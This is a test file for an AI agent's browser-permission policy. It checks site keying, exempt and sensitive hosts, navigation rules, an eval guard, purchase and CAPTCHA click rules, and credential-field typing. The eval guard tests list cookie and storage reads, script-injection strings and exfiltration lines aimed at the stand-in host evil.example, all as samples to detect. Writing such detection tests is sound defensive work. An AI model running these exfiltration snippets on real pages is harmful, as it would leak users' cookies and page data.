// The browser policy, headless: sites and their keys, exempt and sensitive hosts, the navigation rule, the eval
// guard, clicks, typing and keys, the site decision across the five modes, and the card's words. Pure functions, no
// window and no model.
// Run: npm run build && node test/run.js browser-policy
const path = require('node:path');
const os = require('node:os');
const projectDir = process.argv[2] || path.join(__dirname, '..');
const policy = require(path.join(projectDir, 'dist/main/browser/policy.js'));
const { check } = require('./support/check.js');

let checks = 0;
let failures = 0;
const t = (label, cond, detail) => {
  checks++;
  if (!cond) failures++;
  check(label, cond, detail);
};

const { siteOf, isExempt, BUILT_IN_EXEMPT, isSensitive, looksLikeSignInPage, SENSITIVE_PATTERNS, navigationRule, siteDecision, evalGuard, clickRule, typeRule, keyRule, typesACharacter, CREDENTIAL_REFUSAL, READ_ONLY_BROWSER_TOOLS, actionOf, siteCardLabels, actionLine, signInPageKey } = policy;
const home = os.homedir();
const cwd = '/Users/ada/Projects/site';

// ---------- 1. Sites ----------
const s = siteOf('https://www.Example.COM:443/a/b?c=1#frag');
t('1: a web site is keyed by its lower-case host, the default port dropped', s && s.key === 'www.example.com' && s.display === 'www.example.com' && s.scheme === 'https' && s.host === 'www.example.com' && s.port === '' && s.path === '/a/b?c=1', s);
t('1: the apex and www are separate sites', siteOf('https://example.com/').key === 'example.com' && siteOf('https://www.example.com/').key !== siteOf('https://example.com/').key);
t('1: a non-default port is part of the key and the display', siteOf('http://localhost:3000/x').key === 'localhost:3000' && siteOf('http://localhost:3000/x').display === 'localhost:3000' && siteOf('https://example.com:8443/').key === 'example.com:8443');
t('1: http on 80 and https on 443 drop the port; https on 80 keeps it', siteOf('http://example.com:80/').key === 'example.com' && siteOf('https://example.com:80/').key === 'example.com:80');
t('1: an IPv6 host keeps its brackets', siteOf('http://[::1]:8080/').key === '[::1]:8080' && siteOf('http://[::1]/').key === '[::1]');
const idn = siteOf('https://xn--pple-43d.com/');
t('1: an internationalised name shows both forms so a look-alike stands out', idn && idn.key === 'xn--pple-43d.com' && idn.display === 'xn--pple-43d.com (аpple.com)', idn);
t('1: … and a plain ASCII name shows once', siteOf('https://apple.com/').display === 'apple.com');
t('1: a Unicode URL is keyed by its ASCII form', siteOf('https://münchen.de/').key === 'xn--mnchen-3ya.de' && siteOf('https://münchen.de/').display === 'xn--mnchen-3ya.de (münchen.de)');
t('1: credentials in the URL are not part of the site', siteOf('http://user:pw@example.com/').key === 'example.com');
t('1: about:blank, data:, javascript: and blob: have no site', ['about:blank', 'data:text/html,hi', 'javascript:alert(1)', 'blob:https://example.com/uuid', 'about:srcdoc'].every((u) => siteOf(u) === null));
t('1: what is not a URL has no site', siteOf('weather today') === null && siteOf('') === null && siteOf('example.com/path') === null);
const f = siteOf('file:///Users/ada/My%20Docs/a.html');
t('1: a file: URL is keyed by its decoded path', f && f.key === 'file:/Users/ada/My Docs/a.html' && f.scheme === 'file' && f.host === '' && f.port === '' && f.path === '/Users/ada/My Docs/a.html', f);
t('1: … and displayed with the home folder as ~', siteOf(`file://${home}/notes/a.html`).display === '~/notes/a.html' && siteOf(`file://${home}`).display === '~' && siteOf('file:///etc/hosts').display === '/etc/hosts');
const art = siteOf('artifact://view/s1/a1');
t('1: an artifact is a site of its own, named plainly', art && art.scheme === 'artifact' && art.key === 'artifact:view/s1/a1' && art.display === 'this artifact', art);

// ---------- 2. Exempt hosts ----------
t('2: the built-in list is what Settings shows', JSON.stringify(BUILT_IN_EXEMPT) === JSON.stringify(['localhost', '127.0.0.1', '[::1]', '*.localhost', '*.test']));
for (const u of ['http://localhost/', 'http://localhost:3000/app', 'https://LOCALHOST:8443/', 'http://127.0.0.1/', 'http://127.0.0.1:5173/', 'http://[::1]/', 'http://[::1]:8080/x', 'http://app.localhost/', 'http://app.localhost:4000/', 'https://myapp.test/', 'http://api.myapp.test:9000/']) t(`2: ${u} is exempt`, isExempt(u, [], cwd));
for (const u of ['https://example.com/', 'https://localhost.example.com/', 'https://test/', 'https://mytest.com/', 'https://notlocalhost/', 'http://127.0.0.2/', 'http://10.0.0.5/']) t(`2: ${u} is not`, !isExempt(u, [], cwd));
t('2: a user host matches that host only', isExempt('https://dev.example.com/', ['dev.example.com'], cwd) && !isExempt('https://api.dev.example.com/', ['dev.example.com'], cwd) && !isExempt('https://example.com/', ['dev.example.com'], cwd));
t('2: *.host matches the subdomains, not the apex', isExempt('https://api.example.com/', ['*.example.com'], cwd) && isExempt('https://a.b.example.com/', ['*.example.com'], cwd) && !isExempt('https://example.com/', ['*.example.com'], cwd) && !isExempt('https://notexample.com/', ['*.example.com'], cwd));
t('2: host:port matches that port only', isExempt('http://dev.example.com:8080/', ['dev.example.com:8080'], cwd) && !isExempt('http://dev.example.com:9000/', ['dev.example.com:8080'], cwd) && !isExempt('https://dev.example.com/', ['dev.example.com:8080'], cwd));
t('2: … and a host without a port matches any port', isExempt('http://dev.example.com:9000/', ['dev.example.com'], cwd));
t('2: patterns are case-insensitive, and a pasted URL works too', isExempt('https://dev.example.com/', ['DEV.Example.com'], cwd) && isExempt('https://dev.example.com/', ['https://dev.example.com/some/path'], cwd));
t('2: an empty or blank pattern matches nothing', !isExempt('https://example.com/', ['', '  '], cwd));
t('2: a file inside the working directory is exempt', isExempt(`file://${cwd}/index.html`, [], cwd) && isExempt(`file://${cwd}/deep/er/page.html`, [], cwd));
t('2: … the folder itself counts', isExempt(`file://${cwd}`, [], cwd) && isExempt(`file://${cwd}/`, [], cwd));
t('2: … a sibling with the same prefix does not', !isExempt('file:///Users/ada/Projects/site-2/index.html', [], cwd));
t('2: a file outside it is not', !isExempt('file:///Users/ada/.ssh/config', [], cwd) && !isExempt('file:///etc/hosts', [], cwd));
t('2: … nor any file when there is no working directory', !isExempt('file:///Users/ada/Projects/site/index.html', [], ''));
t('2: a folder the user listed makes its files exempt', isExempt('file:///Users/ada/notes/a.html', ['/Users/ada/notes'], cwd) && isExempt(`file://${home}/notes/a.html`, ['~/notes'], cwd) && !isExempt('file:///Users/ada/other/a.html', ['/Users/ada/notes'], cwd));
t('2: an artifact page is exempt', isExempt('artifact://view/s1/a1', [], cwd));
t('2: about:blank is not (it has no site)', !isExempt('about:blank', [], cwd));

// ---------- 3. Sensitive sites ----------
const kind = (u, extra = []) => isSensitive(u, extra).kind;
t('3: the patterns are listed with their kinds for Settings', SENSITIVE_PATTERNS.length > 40 && SENSITIVE_PATTERNS.every((p) => typeof p.pattern === 'string' && ['sign-in', 'email', 'financial', 'payment', 'vault'].includes(p.kind)) && SENSITIVE_PATTERNS.some((p) => p.pattern === 'paypal.com' && p.kind === 'financial'));
t('3: an identity provider is a sign-in site', kind('https://accounts.google.com/signin') === 'sign-in' && isSensitive('https://accounts.google.com/').note === 'This looks like a sign-in site');
t('3: webmail is an email site', kind('https://mail.google.com/mail/u/0/') === 'email' && isSensitive('https://outlook.office.com/').note === 'This looks like an email site');
t('3: a bank is a financial site', kind('https://www.chase.com/') === 'financial' && isSensitive('https://paypal.com/').note === 'This looks like a financial site');
t('3: a payment page is one', kind('https://checkout.stripe.com/c/pay/x') === 'payment' && isSensitive('https://checkout.stripe.com/').note === 'This looks like a payment page');
t('3: a vault is one', kind('https://vault.bitwarden.com/') === 'vault' && isSensitive('https://my.1password.com/').note === 'This looks like a password vault');
t('3: a subdomain of a listed host counts', kind('https://www.paypal.com/') === 'financial' && kind('https://secure.fidelity.com/') === 'financial');
t('3: … but a host that only ends with the name does not', kind('https://notpaypal.com/') === null && kind('https://fakechase.com/') === null);
t('3: *.auth0.com matches the tenants, not the apex', kind('https://acme.auth0.com/') === 'sign-in' && kind('https://auth0.com/') === null);
t('3: the prefix rules', kind('https://login.example.com/') === 'sign-in' && kind('https://sso.corp.example/') === 'sign-in' && kind('https://id.example.org/') === 'sign-in' && kind('https://mail.example.com/') === 'email' && kind('https://pay.example.com/') === 'payment' && kind('https://checkout.example.com/') === 'payment');
t('3: … match the start of the host only', kind('https://mylogin.example.com/') === null && kind('https://www.login-page.com/') === null && kind('https://email.example.com/') === null);
t('3: the word bank', kind('https://mybank.example/') === 'financial' && kind('https://bankofamerica.com/') === 'financial' && kind('https://online.bank.de/') === 'financial' && kind('https://my-bank.example/') === 'financial');
t('3: … not inside another word', kind('https://embankment.org/') === null && kind('https://riverbanks.example/') === null);
t('3: *.gov and *.gov.uk', kind('https://www.irs.gov/') === 'financial' && kind('https://www.gov.uk/') === 'financial' && kind('https://hmrc.gov.uk/') === 'financial' && kind('https://government.example/') === null);
t('3: a user pattern adds a site, read as a sign-in site', kind('https://intranet.corp.example/', ['intranet.corp.example']) === 'sign-in' && kind('https://hr.corp.example/', ['*.corp.example']) === 'sign-in' && kind('https://www.corp.example/', ['corp.example']) === 'sign-in');
t('3: ordinary sites are not sensitive', kind('https://example.com/') === null && kind('https://github.com/login') === null && kind('https://www.wikipedia.org/') === null && isSensitive('https://example.com/').sensitive === false && isSensitive('https://example.com/').note === '');
t('3: an exempt host is never sensitive, whatever its name', kind('http://login.localhost/') === null && kind('http://bank.test/') === null && kind('http://localhost:3000/login') === null && kind('http://login.localhost:8080/', ['login.localhost']) === null);
t('3: only web pages can be', kind('file:///Users/ada/bank/index.html') === null && kind('artifact://view/s1/a1') === null && kind('about:blank') === null);
const page = looksLikeSignInPage({ hasPasswordField: true });
t('3: a page with a password field is a sign-in page', page.sensitive && page.kind === 'sign-in' && page.note === 'This looks like a sign-in page', page);
t('3: … and one without is nothing', JSON.stringify(looksLikeSignInPage({ hasPasswordField: false })) === JSON.stringify({ sensitive: false, kind: null, note: '' }));

// ---------- 4. Navigation ----------
const nav = (u, extra = []) => navigationRule(u, cwd, extra);
for (const u of ['javascript:alert(1)', 'data:text/html,<h1>hi</h1>', 'blob:https://example.com/uuid', 'chrome://settings', 'devtools://devtools/bundled/x', 'view-source:https://example.com/', 'about:config', 'about:srcdoc']) {
  const r = nav(u);
  t(`4: ${u.split(':')[0]}: is refused, pointing at create_artifact`, r.kind === 'refuse' && /create_artifact/.test(r.message) && /^Not permitted/.test(r.message), r);
}
t('4: about:blank is allowed', nav('about:blank').kind === 'allow');
t('4: http and https are allowed (the site card is decided separately)', nav('http://example.com/').kind === 'allow' && nav('https://accounts.google.com/').kind === 'allow');
t('4: an artifact is allowed', nav('artifact://view/s1/a1').kind === 'allow');
t('4: a file inside the working directory is allowed', nav(`file://${cwd}/index.html`).kind === 'allow');
const outside = nav('file:///Users/ada/.ssh/config');
t('4: a file outside it asks, with the path', outside.kind === 'ask' && outside.detail === 'Read the local file /Users/ada/.ssh/config in the browser', outside);
t('4: … the home folder as ~', nav(`file://${home}/.ssh/config`).detail === 'Read the local file ~/.ssh/config in the browser');
t('4: … unless its folder is on the exempt list', nav('file:///Users/ada/notes/a.html', ['/Users/ada/notes']).kind === 'allow');
t('4: other schemes are refused', nav('ftp://example.com/').kind === 'refuse' && nav('mailto:a@b.c').kind === 'refuse' && /ftp:/.test(nav('ftp://example.com/').message));
t('4: what is not a URL is refused (the caller resolves searches and relative paths first)', nav('weather today').kind === 'refuse' && nav('').kind === 'refuse');

// ---------- 5. The eval guard ----------
const storage = "reads the site's cookies or storage";
const sends = 'sends data from the page';
const secretWord = 'looks for a password, token or secret';
const away = 'navigates away';
const injects = 'runs code in the page';
const triggers = [
  ['document.cookie', storage],
  ['localStorage.getItem("k")', storage],
  ['window.sessionStorage.length', storage],
  ['indexedDB.databases()', storage],
  ['caches.keys()', storage],
  ['fetch("/api")', sends],
  ['new XMLHttpRequest()', sends],
  ['navigator.sendBeacon(u, d)', sends],
  ['new WebSocket("wss://x")', sends],
  ['new EventSource("/s")', sends],
  ['parent.postMessage(d, "*")', sends],
  ['import("https://evil.example/x.js")', sends],
  ['importScripts("x.js")', sends],
  ['navigator.credentials.get()', "asks for the user's saved credentials"],
  ['document.querySelector("#password")', secretWord],
  ['window.__token', secretWord],
  ['config.clientSecret', secretWord],
  ['getCredentials()', secretWord],
  ['document.querySelector("input").value', "reads a form field's value"],
  ['location = "https://evil.example"', away],
  ['location.href = "https://evil.example"', away],
  ['window.location.href = x', away],
  ['document.location = x', away],
  ['location.assign(x)', away],
  ['window.open("https://evil.example")', away],
  ['eval(code)', injects],
  ['new Function("return 1")()', injects],
  ['el.innerHTML = "<b>x</b>"', injects],
  ['document.body.insertAdjacentHTML("beforeend", s)', injects],
  ['s = "<script>alert(1)</script>"', injects],
  ['new FormData(document.forms[0])', "reads a form field's value"],
  ['document.forms.length', "reads a form field's value"],
  ['form.elements.email', "reads a form field's value"],
  ['input.defaultValue', "reads a form field's value"],
  ['new Image().src = "https://evil.example/?d=" + document.title', sends],
  ['a.href = "https://evil.example/?d=" + x', sends],
  ['document.querySelector("form").action = "https://evil.example/"', sends],
  ['frame.srcdoc = html', sends],
  ['img.src += "?x=" + data', sends],
  ['new RTCPeerConnection()', sends],
  ['navigator.serviceWorker.register("/sw.js")', sends],
];
for (const [code, reason] of triggers) t(`5: ${code} → ${reason}`, evalGuard(code) === reason, evalGuard(code));
for (const code of ['document.title', "document.querySelectorAll('h2').length", 'document.body.innerText.slice(0, 200)', "[...document.querySelectorAll('a')].map(a => a.href)", 'Object.values(window.dataLayer || {}).length', 'document.evaluate("//h1", document, null, 9, null).singleNodeValue.textContent', 'location.href === "x" ? 1 : 2', 'x.valueOf()', 'document.cookieBanner', '', "document.querySelector('a').href", 'img.src', 'a.href === b.href', 'el.srcset', "document.elementsFromPoint(1, 2).length", 'formsCount + 1']) t(`5: harmless: ${code || '(nothing)'}`, evalGuard(code) === null, evalGuard(code));
t('5: location.href = … still reads as navigating away, not as a link pointed elsewhere', evalGuard('location.href = u') === away && evalGuard('window.location.href = u') === away);

// ---------- 6. Clicks ----------
const button = (text, extra = {}) => clickRule({ text, role: '', tag: 'button', type: '', inCaptcha: false, formHasCardFields: false, formActionHost: null, ...extra });
for (const text of ['Pay now', 'Pay $49.00', 'PAY', 'Place order', 'Place your order', 'Buy now', 'Buy', 'Complete purchase', 'Complete order', 'Confirm payment', 'Confirm  purchase', 'Confirm order', 'Checkout', 'Proceed to checkout', 'Check out', 'Purchase', 'Subscribe now', 'Start subscription', 'Upgrade now', 'Order now']) {
  const r = button(text);
  t(`6: "${text}" asks as a purchase`, r.kind === 'ask' && r.what === 'purchase' && r.detail.includes('looks like a purchase'), r);
}
for (const text of ['Create account', 'Create an account', 'Create your account', 'Sign up', 'Sign Up', 'Register', 'Join now', 'Get started free']) {
  const r = button(text);
  t(`6: "${text}" asks as account creation`, r.kind === 'ask' && r.what === 'account' && r.detail.includes('looks like account creation'), r);
}
for (const text of ['Sign in', 'Log in', 'Subscribe', 'Search', 'Next', 'Save', "Buyer's guide", 'Payment methods', 'Registered users', 'Purchases']) t(`6: "${text}" is a plain click`, button(text).kind === 'allow', button(text));
t('6: a div with role=button counts as a button', clickRule({ text: 'Buy now', role: 'button', tag: 'div', type: '', inCaptcha: false, formHasCardFields: false, formActionHost: null }).kind === 'ask');
t('6: an input type=submit counts', clickRule({ text: 'Place order', role: '', tag: 'INPUT', type: 'submit', inCaptcha: false, formHasCardFields: false, formActionHost: null }).kind === 'ask');
t('6: a link that says Checkout only leads there: a plain click', clickRule({ text: 'Checkout', role: 'link', tag: 'a', type: '', inCaptcha: false, formHasCardFields: false, formActionHost: null }).kind === 'allow');
t('6: a heading is not a button', clickRule({ text: 'Buy now', role: '', tag: 'h2', type: '', inCaptcha: false, formHasCardFields: false, formActionHost: null }).kind === 'allow');
const card = button('Continue', { formHasCardFields: true });
t('6: a submit in a form with card fields asks as a purchase', card.kind === 'ask' && card.what === 'purchase' && card.detail === 'The form holds card fields', card);
const payHost = button('Continue', { formActionHost: 'checkout.stripe.com' });
t('6: a submit posting to a payment host asks', payHost.kind === 'ask' && payHost.what === 'purchase' && payHost.detail === 'The form posts to checkout.stripe.com, a payment host', payHost);
t('6: … *.adyen.com and a pay. host too', button('Continue', { formActionHost: 'live.adyen.com' }).kind === 'ask' && button('Continue', { formActionHost: 'pay.example.com' }).kind === 'ask');
t('6: … a form posting to an ordinary host is a plain click', button('Continue', { formActionHost: 'www.example.com' }).kind === 'allow' && button('Continue', { formActionHost: 'accounts.google.com' }).kind === 'allow');
t('6: a type=button in a card form is not a submit', button('Apply coupon', { type: 'button', formHasCardFields: true }).kind === 'allow');
t('6: a newsletter Subscribe (no card fields) is a plain click', button('Subscribe').kind === 'allow' && clickRule({ text: 'Subscribe', role: '', tag: 'input', type: 'submit', inCaptcha: false, formHasCardFields: false, formActionHost: 'news.example.com' }).kind === 'allow');
const captcha = clickRule({ text: "I'm not a robot", role: 'checkbox', tag: 'span', type: '', inCaptcha: true, formHasCardFields: false, formActionHost: null });
t('6: a click inside a CAPTCHA is refused', captcha.kind === 'refuse' && /CAPTCHAs are for the user to solve/.test(captcha.message) && /^Not permitted/.test(captcha.message), captcha);
t('6: … even when it reads like a purchase', button('Pay now', { inCaptcha: true }).kind === 'refuse');
t('6: texts are clipped in the detail', button(`Buy now ${'x'.repeat(200)}`).detail.length < 110);

// ---------- 7. Typing and keys ----------
t('7: an ordinary field is typed into anywhere', typeRule(null, false).kind === 'allow' && typeRule(null, true).kind === 'allow');
for (const k of ['password', 'one-time code', 'card', 'embedded']) {
  const r = typeRule(k, false);
  t(`7: a ${k} field on a site is refused`, r.kind === 'refuse' && r.message === CREDENTIAL_REFUSAL, r);
  t(`7: … and typed into on an exempt site`, typeRule(k, true).kind === 'allow');
}
t('7: the refusal tells the model what to do', /passwords, one-time codes and card details are for the user to type/i.test(CREDENTIAL_REFUSAL) && /Ask them to sign in \(or fill the card\) in the Browser pane, then continue\./.test(CREDENTIAL_REFUSAL) && /^Not permitted/.test(CREDENTIAL_REFUSAL));
for (const k of ['a', 'Z', '1', '.', '+', 'é', 'space', 'Space', 'shift+a', 'alt+e', 'shift++', 'shift+1']) t(`7: ${k} types a character`, typesACharacter(k));
for (const k of ['Enter', 'Tab', 'Escape', 'ArrowDown', 'ArrowLeft', 'Backspace', 'Delete', 'Home', 'End', 'PageUp', 'PageDown', 'cmd+a', 'ctrl+c', 'cmd+shift+v', 'meta+v', 'F5', '']) t(`7: ${k || '(nothing)'} does not`, !typesACharacter(k));
t('7: a character key into a credential field on a site is refused', keyRule('a', 'password', false).kind === 'refuse' && keyRule('a', 'password', false).message === CREDENTIAL_REFUSAL && keyRule('space', 'card', false).kind === 'refuse' && keyRule('shift+a', 'one-time code', false).kind === 'refuse' && keyRule('x', 'embedded', false).kind === 'refuse');
t('7: … Enter, Tab, Escape, arrows, deletions and shortcuts go through', ['Enter', 'Tab', 'Escape', 'ArrowDown', 'Backspace', 'Delete', 'Home', 'End', 'PageDown', 'cmd+a', 'ctrl+v'].every((k) => keyRule(k, 'password', false).kind === 'allow'));
t('7: … on an exempt site every key goes through', keyRule('a', 'password', true).kind === 'allow' && keyRule('space', 'embedded', true).kind === 'allow');
t('7: … and into an ordinary field too', keyRule('a', null, false).kind === 'allow');

// ---------- 8. The site decision ----------
const modes = ['ask', 'acceptEdits', 'auto', 'plan', 'bypass'];
const actions = ['read', 'act', 'eval', 'navigate'];
const settings = { exempt: [], alwaysAllowed: [], sensitive: [] };
const decide = (url, action, mode, extra = {}) => siteDecision({ url, action, mode, cwd, settings, sessionAllowed: new Set(), ...extra });
const allowed = new Set(['example.com', 'accounts.google.com', 'www.paypal.com', 'login.example.com']);
for (const mode of modes) {
  t(`8: ${mode}: about:blank is allowed for every action`, actions.every((a) => decide('about:blank', a, mode).kind === 'allow'));
  t(`8: ${mode}: an exempt site allows everything: eval, a password field, a sign-in name`, actions.every((a) => decide('http://localhost:3000/login', a, mode, { evalCode: 'document.cookie', pageHasPasswordField: true }).kind === 'allow') && decide('http://login.localhost/', 'act', mode).kind === 'allow');
  t(`8: ${mode}: a user-exempt host too`, decide('https://dev.example.com/', 'act', mode, { settings: { ...settings, exempt: ['dev.example.com'] } }).kind === 'allow');
}
for (const mode of ['ask', 'acceptEdits', 'auto']) {
  for (const action of actions) {
    const r = decide('https://example.com/a', action, mode);
    t(`8: ${mode}: ${action} on a new site asks with the site card`, r.kind === 'ask' && r.card === 'site' && r.site.key === 'example.com' && r.note === undefined && r.reason === undefined, r);
  }
}
t('8: plan: a read or a navigation to a new site asks with the site card (a URL can carry data out)', decide('https://example.com/', 'read', 'plan').kind === 'ask' && decide('https://example.com/', 'read', 'plan').card === 'site' && decide('https://example.com/', 'navigate', 'plan').card === 'site');
t('8: plan: … and an allowed site reads without a card', decide('https://example.com/', 'read', 'plan', { sessionAllowed: allowed }).kind === 'allow' && decide('https://example.com/', 'navigate', 'plan', { sessionAllowed: allowed }).kind === 'allow');
for (const action of ['act', 'eval']) {
  const r = decide('https://example.com/', action, 'plan', { sessionAllowed: allowed });
  t(`8: plan: ${action} is refused, allowed site or not`, r.kind === 'refuse' && /^Not permitted in plan mode: the browser is read-only while planning/.test(r.message) && decide('https://example.com/', action, 'plan').kind === 'refuse', r);
}
t('8: bypass: a new site is allowed for every action', actions.every((a) => decide('https://example.com/', a, 'bypass').kind === 'allow'));
for (const mode of ['ask', 'acceptEdits', 'auto']) {
  t(`8: ${mode}: a site allowed this session reads, acts and navigates without a card`, ['read', 'act', 'navigate'].every((a) => decide('https://example.com/x', a, mode, { sessionAllowed: allowed }).kind === 'allow'));
  t(`8: ${mode}: … or always allowed by its key`, ['read', 'act', 'navigate'].every((a) => decide('https://example.com/x', a, mode, { settings: { ...settings, alwaysAllowed: ['example.com'] } }).kind === 'allow'));
}
t('8: the approval is by key: another port or a subdomain is another site', decide('https://example.com:8443/', 'read', 'ask', { sessionAllowed: allowed }).kind === 'ask' && decide('https://www.example.com/', 'read', 'ask', { sessionAllowed: allowed }).kind === 'ask');
const always = (list) => ({ settings: { ...settings, alwaysAllowed: list } });
t('8: always-allowed patterns: *.host covers the subdomains, host:port that port', decide('https://api.example.org/', 'read', 'ask', always(['*.example.org'])).kind === 'allow' && decide('https://example.org/', 'read', 'ask', always(['*.example.org'])).kind === 'ask' && decide('http://example.org:8080/', 'read', 'ask', always(['example.org:8080'])).kind === 'allow' && decide('http://example.org:9090/', 'read', 'ask', always(['example.org:8080'])).kind === 'ask');
for (const mode of ['ask', 'acceptEdits']) {
  const r = decide('https://example.com/', 'eval', mode, { sessionAllowed: allowed, evalCode: 'document.title' });
  t(`8: ${mode}: eval on an allowed site asks with the eval card, harmless code or not`, r.kind === 'ask' && r.card === 'eval' && r.reason === undefined && r.note === undefined, r);
}
t('8: auto: harmless eval on an allowed site runs', decide('https://example.com/', 'eval', 'auto', { sessionAllowed: allowed, evalCode: "document.querySelectorAll('h2').length" }).kind === 'allow' && decide('https://example.com/', 'eval', 'auto', { sessionAllowed: allowed }).kind === 'allow');
const guarded = decide('https://example.com/', 'eval', 'auto', { sessionAllowed: allowed, evalCode: 'fetch("https://evil.example/x", { body: document.cookie })' });
t('8: auto: eval that reaches for site data asks with the reason', guarded.kind === 'ask' && guarded.card === 'eval' && guarded.reason === storage, guarded);
t('8: bypass: eval runs whatever the code', decide('https://example.com/', 'eval', 'bypass', { evalCode: 'document.cookie' }).kind === 'allow');
for (const mode of ['ask', 'acceptEdits', 'auto']) {
  const r = decide('https://www.paypal.com/myaccount', 'act', mode, { sessionAllowed: allowed });
  t(`8: ${mode}: an act on an allowed sensitive site asks with the amber note`, r.kind === 'ask' && r.card === 'sensitive' && r.note === 'This looks like a financial site' && r.site.key === 'www.paypal.com', r);
  t(`8: ${mode}: … a read or a navigation there does not`, decide('https://www.paypal.com/', 'read', mode, { sessionAllowed: allowed }).kind === 'allow' && decide('https://www.paypal.com/', 'navigate', mode, { sessionAllowed: allowed }).kind === 'allow');
}
t('8: bypass: an act on a sensitive site runs', decide('https://www.paypal.com/', 'act', 'bypass').kind === 'allow' && decide('https://accounts.google.com/', 'act', 'bypass', { pageHasPasswordField: true }).kind === 'allow');
t('8: the site card for a sensitive site carries the note from the start', decide('https://accounts.google.com/', 'read', 'ask').note === 'This looks like a sign-in site');
const pw = decide('https://example.com/login', 'act', 'auto', { sessionAllowed: allowed, pageHasPasswordField: true });
t('8: a password field on an ordinary site makes its act ask as a sign-in page', pw.kind === 'ask' && pw.card === 'sensitive' && pw.note === 'This looks like a sign-in page', pw);
t('8: … and not without it', decide('https://example.com/login', 'act', 'auto', { sessionAllowed: allowed, pageHasPasswordField: false }).kind === 'allow');
t('8: … nor for a read of that page', decide('https://example.com/login', 'read', 'auto', { sessionAllowed: allowed, pageHasPasswordField: true }).kind === 'allow');
t('8: a user sensitive pattern asks as a sign-in site', decide('https://intranet.corp.example/', 'act', 'auto', { sessionAllowed: new Set(['intranet.corp.example']), settings: { ...settings, sensitive: ['intranet.corp.example'] } }).note === 'This looks like a sign-in site');
const evalSensitive = decide('https://www.paypal.com/', 'eval', 'auto', { sessionAllowed: allowed, evalCode: 'document.title' });
t('8: auto: eval on a sensitive site asks even when the guard is quiet (eval acts on the page)', evalSensitive.kind === 'ask' && evalSensitive.card === 'eval' && evalSensitive.note === 'This looks like a financial site' && evalSensitive.reason === undefined, evalSensitive);
t('8: a file inside the working directory is exempt', ['read', 'act'].every((a) => decide(`file://${cwd}/index.html`, a, 'ask').kind === 'allow'));
const fileCard = decide('file:///Users/ada/.ssh/config', 'read', 'ask');
t('8: a file outside asks with the site card keyed by its path', fileCard.kind === 'ask' && fileCard.card === 'site' && fileCard.site.key === 'file:/Users/ada/.ssh/config', fileCard);
t('8: … and the session approval of that key reads it', decide('file:///Users/ada/.ssh/config', 'read', 'ask', { sessionAllowed: new Set(['file:/Users/ada/.ssh/config']) }).kind === 'allow' && decide('file:///Users/ada/.ssh/config', 'read', 'ask', always(['file:/Users/ada/.ssh/config'])).kind === 'allow');
t('8: an artifact page is exempt in every mode', modes.every((m) => decide('artifact://view/s1/a1', 'act', m).kind === 'allow'));

// ---------- 9. For the card and the tools ----------
t('9: the read-only tools', [...READ_ONLY_BROWSER_TOOLS].sort().join(',') === 'browser_find,browser_get_text,browser_navigate,browser_read_page,browser_screenshot,browser_scroll,browser_tabs,browser_wait_for' && !READ_ONLY_BROWSER_TOOLS.has('browser_click') && !READ_ONLY_BROWSER_TOOLS.has('browser_eval'));
t('9: what each tool does', actionOf('browser_navigate', { url: 'x' }) === 'navigate' && actionOf('browser_tabs', { action: 'new', url: 'x' }) === 'navigate' && actionOf('browser_tabs', { action: 'list' }) === 'read' && actionOf('browser_tabs', { action: 'select', tab_id: 2 }) === 'read' && actionOf('browser_eval', { code: '1' }) === 'eval' && ['browser_click', 'browser_type', 'browser_press_key'].every((n) => actionOf(n, {}) === 'act') && ['browser_get_text', 'browser_read_page', 'browser_find', 'browser_wait_for', 'browser_scroll', 'browser_screenshot'].every((n) => actionOf(n, {}) === 'read'));
t('9: an unknown browser tool is treated as acting', actionOf('browser_future', {}) === 'act');
const ex = siteOf('https://example.com/');
const labels = siteCardLabels(ex);
t('9: the card labels', labels.alwaysLabel === 'Allow example.com for this session' && labels.projectLabel === 'Always allow example.com', labels);
t('9: … name the port and a look-alike', siteCardLabels(siteOf('http://localhost:3000/')).alwaysLabel === 'Allow localhost:3000 for this session' && siteCardLabels(idn).projectLabel === 'Always allow xn--pple-43d.com (аpple.com)');
const acc = siteOf('https://accounts.example.com/');
t('9: Open example.com', actionLine('browser_navigate', { url: 'https://example.com/' }, ex) === 'Open example.com');
t('9: Open about:blank, Go back, Go forward', actionLine('browser_navigate', { url: 'about:blank' }, null) === 'Open about:blank' && actionLine('browser_navigate', { url: 'back' }, ex) === 'Go back' && actionLine('browser_navigate', { url: 'forward' }, null) === 'Go forward');
t('9: Click "Sign in" on accounts.example.com', actionLine('browser_click', { text: 'Sign in' }, acc) === 'Click "Sign in" on accounts.example.com');
t('9: clicks by ref and at coordinates', actionLine('browser_click', { ref: 'ref_3' }, ex) === 'Click ref_3 on example.com' && actionLine('browser_click', { x: 120, y: 40 }, ex) === 'Click at (120, 40) on example.com');
t('9: Type into "Search" on example.com', actionLine('browser_type', { field: 'Search', text: 'hello' }, ex) === 'Type into "Search" on example.com');
t('9: … never the text of a credential field', actionLine('browser_type', { field: 'Password', text: 'hunter2', secret: true }, ex) === 'Type into the password field on example.com' && actionLine('browser_type', { text: '123456', secret: true, secretKind: 'one-time code' }, ex) === 'Type into the one-time code field on example.com');
t('9: … by ref, or into the focused field', actionLine('browser_type', { ref: 'ref_5', text: 'x' }, ex) === 'Type into ref_5 on example.com' && actionLine('browser_type', { text: 'x' }, ex) === 'Type into the focused field on example.com');
t('9: Press Enter on example.com', actionLine('browser_press_key', { key: 'Enter' }, ex) === 'Press Enter on example.com');
t('9: Run JavaScript on example.com', actionLine('browser_eval', { code: 'document.title' }, ex) === 'Run JavaScript on example.com');
t('9: Open a new tab at example.com, and the other tab actions', actionLine('browser_tabs', { action: 'new', url: 'https://example.com/' }, ex) === 'Open a new tab at example.com' && actionLine('browser_tabs', { action: 'new' }, null) === 'Open a new tab' && actionLine('browser_tabs', { action: 'list' }, null) === 'List the tabs' && actionLine('browser_tabs', { action: 'close', tab_id: 2 }, null) === 'Close tab 2' && actionLine('browser_tabs', { action: 'select', tab_id: 1 }, null) === 'Switch to tab 1');
t('9: Read example.com', ['browser_get_text', 'browser_read_page', 'browser_find', 'browser_wait_for', 'browser_scroll', 'browser_screenshot'].every((n) => actionLine(n, {}, ex) === 'Read example.com') && actionLine('browser_get_text', {}, null) === 'Read the page');
const long = actionLine('browser_click', { text: `Accept ${'terms '.repeat(40)}` }, ex);
t('9: long texts are clipped to 80 characters', long.length < 110 && long.includes('…') && long.endsWith(' on example.com'), long);
t('9: a file page is named by its path', actionLine('browser_navigate', { url: `file://${home}/notes/a.html` }, siteOf(`file://${home}/notes/a.html`)) === 'Open ~/notes/a.html');
